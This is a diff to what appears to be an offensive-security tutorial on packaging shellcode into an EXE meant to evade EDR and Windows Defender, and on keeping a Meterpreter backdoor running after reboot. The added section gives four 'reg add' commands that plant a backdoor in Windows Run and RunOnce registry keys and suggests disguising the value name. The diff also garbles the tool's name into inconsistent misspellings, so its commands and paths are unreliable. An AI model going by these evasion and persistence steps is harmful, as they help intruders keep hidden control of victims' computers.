@@ -36,10 +36,10 @@ Once the shellcode is successfully generated, we will pack it into EXE.
 
 ## Packaging the shellcode
 
-There is a open source tool called [Shecodject](https://github.com/TaroballzChen/shecodject) which nicely package our generated shellcode into EXE. Open the tool using python3 as root:
+There is a open source tool called Shecodnject which nicely package our generated shellcode into EXE. Open the tool using python3 as root:
 
 ```
-sudo python3 shecodject.py
+sudo python3 shecodnject.py
 ```
 
 Load scc module, set the shellcode.raw file which we previously generated and run the module to read the shellcode inside the file.
@@ -60,7 +60,7 @@ set noconsole False
 run
 ```
 
-The process of packaging will take a while. Once finished the output will be saved inside /output inside shecodject folder
+The process of packaging will take a while. Once finished the output will be saved inside /output inside shecodeject folder
 
 The EXE is generated and ready to evade modern EDRs and Windows Defender. Let’s test if it gets detected by Windows Defender:
 
@@ -97,3 +97,17 @@ run
 ![metasploit_persistence_module](https://miro.medium.com/max/700/1*ehPmp6GPl5lmgHOINca9vw.png)
 
 The next time that the user will login with the system a new Meterpreter session will open (a black cmd screen will pop-up where it executed the backdoor and than automatically closes).
+
+## Gaining persistence the manual way
+
+Alternatively, you can use these commands to manually add these 4 Registry Run Keys so our backdoor **fin.exe** will be injected. In the demo I have added a random Value **NotAVirus**, but you don't want to leave it that way, you know. Before working with Registries, make sure to upload the backdoor in the target system (which in my case: **C:\tmp\fin.exe**).
+
+```
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v NotAVirus /t REG_SZ /d "C:\tmp\fin.exe"
+```
